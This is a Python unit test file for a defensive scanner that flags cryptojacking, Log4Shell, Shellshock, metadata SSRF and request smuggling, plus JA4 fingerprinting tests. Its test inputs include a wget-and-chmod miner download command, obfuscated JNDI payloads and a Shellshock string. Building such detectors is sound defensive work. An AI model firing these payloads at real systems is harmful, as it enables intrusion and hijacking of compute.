"""Unit tests for the compute-hijack detector, JA4, and the TLS front's rewriter."""

from __future__ import annotations

import base64
import dataclasses
import hashlib
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mirage_crawl import hunt, ja4 as ja4mod  # noqa: E402
from mirage_crawl.tlsfront import RequestRewriter  # noqa: E402

failures: list[str] = []

WALLET = (
    "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgz"
    "YnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD"
)


def check(name: str, condition: bool, detail: str = "") -> None:
    status = "PASS" if condition else "FAIL"
    suffix = f"  ({detail})" if detail and not condition else ""
    print(f"  {status}  {name}{suffix}")
    if not condition:
        failures.append(name)


def test_probe_matching() -> None:
    print("\ncompute-hijack probe matching")
    expected = {
        "/api/tags": ("ollama", "llm_inference"),
        "/v1/chat/completions": ("openai_compat", "llm_inference"),
        "/api/jobs/": ("ray", "gpu_ml"),
        # Both Ollama and Ray serve /api/version. Ollama's is the far more
        # scanned of the two, so its shape wins until per-port routing exists.
        "/api/version": ("ollama", "llm_inference"),
        "/system_stats": ("comfyui", "gpu_ml"),
        "/api/kernels": ("jupyter", "gpu_ml"),
        "/ws/v1/cluster/apps/new-application": ("yarn", "crypto_mining"),
        "/v1/submissions/create": ("spark", "crypto_mining"),
        "/v1.43/containers/json": ("docker", "container"),
        "/.env": ("dotenv", "cloud_creds"),
        "/actuator/env": ("spring", "cloud_creds"),
        "/script": ("jenkins", "exploit"),
    }
    wrong = []
    for path, (family, category) in expected.items():
        probe = hunt.match(path)
        if probe is None or probe.family != family or probe.category != category:
            wrong.append(path)
    check("families and categories correct", not wrong, str(wrong))

    ours = [
        "/docs/p001/00.html", "/robots.txt", "/llms.txt", "/", "/public/",
        "/assets/style.css", "/.well-known/security.txt", "/humans.txt",
        "/sitemap.xml", "/internal/notes/abc/handover.html",
    ]
    collisions = [p for p in ours if hunt.match(p)]
    check("no collision with our own paths", not collisions, str(collisions))

    check("every probe carries MITRE techniques", all(p.mitre for p in hunt.PROBES))
    check("six categories covered", len(hunt.categories()) == 6, str(hunt.categories()))
    check("decoys are strings or absent",
          all(p.decoy is None or isinstance(p.decoy, str) for p in hunt.PROBES))


def test_payload_extraction() -> None:
    print("\npayload indicator extraction")
    config = '{"pools":[{"url":"stratum+tcp://pool.supportxmr.com:3333","user":"%s"}]}' % WALLET
    found = hunt.scan_payload(config)
    check("monero wallet extracted", found.wallets.get("monero") == [WALLET])
    check("stratum url extracted", any("stratum+tcp" in p for p in found.pools))
    check("pool host recognised", "supportxmr" in found.pools)

    inner = b"wget http://45.9.148.99/xmrig -O /tmp/x && chmod +x /tmp/x"
    nested = "cmd=" + base64.b64encode(inner).decode()
    decoded = hunt.scan_payload(nested)
    check("base64 layer decoded", decoded.decoded_layers == 1)
    check("miner binary found inside", "xmrig" in decoded.miners)
    check("downloader found inside", "wget" in decoded.downloaders)
    check("url found inside", any("45.9.148.99" in u for u in decoded.urls))

    check("ethereum wallet extracted",
          hunt.scan_payload("0x" + "a" * 40).wallets.get("ethereum") == ["0x" + "a" * 40])
    check("log4shell detected", bool(hunt.scan_payload("${jndi:ldap://x.test/a}").jndi))
    check("metadata ssrf detected",
          hunt.scan_payload("u=http://169.254.169.254/latest/meta-data/").metadata_ssrf)
    check("ordinary prose yields nothing",
          not hunt.scan_payload("the scheduler blocks until the lease expires").any())
    check("empty payload is safe", not hunt.scan_payload("").any())
    check("as_dict is serialisable", isinstance(found.as_dict()["wallets"], dict))


def test_scanner_upgrades() -> None:
    print("\nscanner: decoding and evasion")
    from urllib.parse import quote

    def jndi(text):
        return hunt.scan_payload(text).jndi

    check("${lower:j}ndi deobfuscated", jndi("${${lower:j}ndi:ldap://x.test/a}") == ["${jndi:ldap://x.test/a}"],
          str(jndi("${${lower:j}ndi:ldap://x.test/a}")))
    check("${::-j}${::-n}di deobfuscated",
          jndi("${${::-j}${::-n}${::-d}${::-i}:rmi://x.test/a}") == ["${jndi:rmi://x.test/a}"])
    check("${env:X:-j} defaults deobfuscated",
          jndi("${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x.test/a}")
          == ["${jndi:ldap://x.test/a}"])
    check("upper-case lookup", jndi("${jNdI:LDAP://x.test/a}") != [])
    check("obfuscation is flagged", hunt.scan_payload("${${lower:j}ndi:ldap://x.test/a}").jndi_obfuscated)
    check("plain jndi is not flagged obfuscated", not hunt.scan_payload("${jndi:ldap://x.test/a}").jndi_obfuscated)
    check("url-encoded jndi found", jndi("%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D") == ["${jndi:ldap://x.test/a}"])

    stratum = "stratum+tcp://pool.example.test:3333"
    triple = quote(quote(quote(stratum, safe=""), safe=""), safe="")
    found = hunt.scan_payload("cfg=" + triple)
    check("triple url-encoding peeled", any(stratum in p for p in found.pools), triple)
    check("url layers counted", found.url_decoded_layers == 3, str(found.url_decoded_layers))

    inner = b"wget http://45.9.148.99/xmrig -O /tmp/x && chmod +x /tmp/x"
    twice = base64.b64encode(base64.b64encode(inner)).decode()
    found = hunt.scan_payload("x=" + twice)
    check("base64 decoded two layers deep", "xmrig" in found.miners and found.decoded_layers == 2,
          f"{found.miners} {found.decoded_layers}")

    check("shellshock marker", hunt.scan_payload("() { :; }; /bin/bash -c id").shellshock)
    check("shellshock with odd spacing", hunt.scan_payload("()  {  _; } >_[$($())] { echo x; }").shellshock)
    check("ordinary parentheses are not shellshock", not hunt.scan_payload("f() returns {a}").shellshock)


def test_wallet_validation() -> None:
    print("\nscanner: wallet checksums")
    valid = [
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",                             # P2PKH (genesis)
        "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",                             # P2SH (BIP13)
        "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4",                     # P2WPKH (BIP173)
        "bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297",  # P2TR (BIP350)
    ]
    for address in valid:
        got = hunt.scan_payload(f"pay {address} now").wallets.get("bitcoin")
        check(f"valid {address[:6]}... accepted", got == [address], str(got))
    mutated = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"
    check("base58check typo rejected", not hunt.scan_payload(mutated).wallets)
    check("bech32 typo rejected", not hunt.scan_payload("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t5").wallets)
    etag = '"1a2b3c4d5e6f7a8b9c1d2e3f4a5b6c7d"'
    check("hex etag is not a bitcoin address", not hunt.scan_payload(etag).wallets)
    from mirage_crawl import beacons
    noisy = sum(
        1 for i in range(3000)
        if hunt.scan_payload(policies_trap(beacons.mint(b"n" * 32, "robots", f"10.0.{i // 250}.{i % 250}", "ua"))).wallets
    )
    check("beacon trap paths never look like wallets", noisy == 0, f"{noisy}/3000")
    hexes = sum(1 for i in range(3000) if hunt.scan_payload(f'"{hashlib.blake2s(str(i).encode(), digest_size=16).hexdigest()}"').wallets)
    check("ETag-style hex never looks like a wallet", hexes == 0, f"{hexes}/3000")


def policies_trap(token: str) -> str:
    return f"/internal/notes/{token}/handover.html"


def test_ja4_computation() -> None:
    print("\nja4")
    check("grease recognised", ja4mod.is_grease(0x0A0A) and ja4mod.is_grease(0xFAFA))
    check("real cipher is not grease", not ja4mod.is_grease(0x1301))
    check("incomplete record rejected",
          not ja4mod.client_hello_complete(b"\x16\x03\x01\x00\xff"))
    check("non-tls rejected", not ja4mod.client_hello_complete(b"GET / HTTP/1.1"))

    hello = ja4mod.ClientHello(
        tls_version=0x0303,
        ciphers=(0x0A0A, 0x1301, 0x1302),
        extensions=(0x0000, 0x0010, 0x002B, 0x000D),
        sig_algs=(0x0403, 0x0804),
        alpn=("h2",),
        sni="x.test",
        supported_versions=(0x0304,),
    )
    fingerprint = ja4mod.ja4(hello)
    part_a, part_b, part_c = fingerprint.split("_")

    check("version taken from supported_versions", part_a.startswith("t13"), fingerprint)
    check("sni flag is d", part_a[3] == "d", fingerprint)
    check("grease excluded from cipher count", part_a[4:6] == "02", fingerprint)
    check("extension count is 04", part_a[6:8] == "04", fingerprint)
    check("alpn code is h2", part_a[-2:] == "h2", fingerprint)
    check("hash halves are 12 chars", len(part_b) == 12 and len(part_c) == 12)

    no_sni = ja4mod.ja4(dataclasses.replace(hello, sni=None))
    check("absent sni flips the flag", no_sni[3] == "i")
    check("sni does not affect the hashes", no_sni.split("_")[2] == part_c)

    no_alpn = ja4mod.ja4(dataclasses.replace(hello, alpn=()))
    check("absent alpn yields 00", no_alpn[8:10] == "00", no_alpn)

    empty = ja4mod.ja4(dataclasses.replace(hello, ciphers=(), sig_algs=()))
    check("empty list hashes to zeroes", empty.split("_")[1] == "000000000000", empty)

    changed = ja4mod.ja4(dataclasses.replace(hello, ciphers=(0x1301,)))
    check("cipher change alters the hash", changed.split("_")[1] != part_b)

    try:
        ja4mod.parse_client_hello(b"GET / HTTP/1.1\r\n\r\n")
        check("garbage raises ParseError", False)
    except ja4mod.ParseError:
        check("garbage raises ParseError", True)


def test_request_rewriter() -> None:
    print("\ntls front request rewriting")
    get_a = b"GET /a HTTP/1.1\r\nHost: x\r\n\r\n"
    get_b = b"GET /b HTTP/1.1\r\nHost: x\r\n\r\n"
    post = b"POST /p HTTP/1.1\r\nHost: x\r\nContent-Length: 11\r\n\r\nhello world"

    def feed(chunks):
        rewriter = RequestRewriter("J4", "9.9.9.9", "X-Mirage-JA4")
        out = b"".join(rewriter.feed(c) for c in chunks)
        return rewriter, out, out.count(b"X-Mirage-JA4: J4")

    check("single request injected", feed([get_a])[2] == 1)
    check("pipelined requests all injected", feed([get_a + get_b])[2] == 2)
    check("separate chunks still injected", feed([get_a, get_b])[2] == 2)
    check("head split mid-way still injected", feed([get_a[:9], get_a[9:]])[2] == 1)

    _, out, count = feed([post + get_b])
    check("body does not break framing", count == 2, str(count))
    check("body bytes preserved", b"hello world" in out)

    spoofed = (
        b"GET / HTTP/1.1\r\nHost: x\r\n"
        b"X-Mirage-JA4: fake\r\nX-Forwarded-For: 1.2.3.4\r\n\r\n"
    )
    _, out, _ = feed([spoofed])
    check("client-supplied ja4 stripped", b"fake" not in out)
    check("client-supplied xff stripped", b"1.2.3.4" not in out)
    check("our ja4 appears exactly once", out.count(b"X-Mirage-JA4:") == 1)
    check("our xff appears exactly once", out.count(b"X-Forwarded-For:") == 1)

    chunked = (
        b"POST /x HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"5\r\nhello\r\n0\r\n\r\n"
    )
    rewriter, out, count = feed([chunked])
    check("chunked head still injected", count == 1)
    check("chunked body preserved", b"5\r\nhello\r\n0\r\n\r\n" in out)
    check("chunked request ends back in head state", rewriter.state == RequestRewriter.HEAD, rewriter.state)

    _, out, count = feed([chunked + get_b])
    check("request after a chunked one is still injected", count == 2, str(count))
    check("pipelined bytes all preserved", out.count(b"hello") == 1 and b"GET /b" in out)

    stream = chunked + get_b
    _, out, count = feed([stream[i:i + 1] for i in range(len(stream))])
    check("chunked framing survives byte-at-a-time delivery", count == 2, str(count))

    fancy = (
        b"POST /x HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: gzip, chunked\r\n\r\n"
        # a 4-byte chunk whose data is itself CRLF CRLF
        b"A;name=val\r\n0123456789\r\n4\r\n\r\n\r\n\r\n0\r\nX-Trailer: 1\r\n\r\n"
    )
    _, out, count = feed([fancy + get_b])
    check("extensions, CRLF-looking data and trailers handled", count == 2, str(count))
    check("trailer forwarded intact", b"X-Trailer: 1\r\n\r\n" in out)

    smuggle = (
        b"POST /x HTTP/1.1\r\nHost: x\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"0\r\n\r\n"
    )
    _, _, count = feed([smuggle + get_b])
    check("Transfer-Encoding wins over Content-Length", count == 2, str(count))

    garbage = b"POST /x HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\nzz\r\n"
    rewriter, out, _ = feed([garbage + get_b])
    check("unparseable chunk size falls back to passthrough",
          rewriter.state == RequestRewriter.PASSTHROUGH and out.endswith(get_b))


if __name__ == "__main__":
    test_probe_matching()
    test_payload_extraction()
    test_scanner_upgrades()
    test_wallet_validation()
    test_ja4_computation()
    test_request_rewriter()
    if failures:
        print("\nFAILURES: " + ", ".join(failures))
    else:
        print("\nall hunt/ja4 checks passed")
    sys.exit(1 if failures else 0)
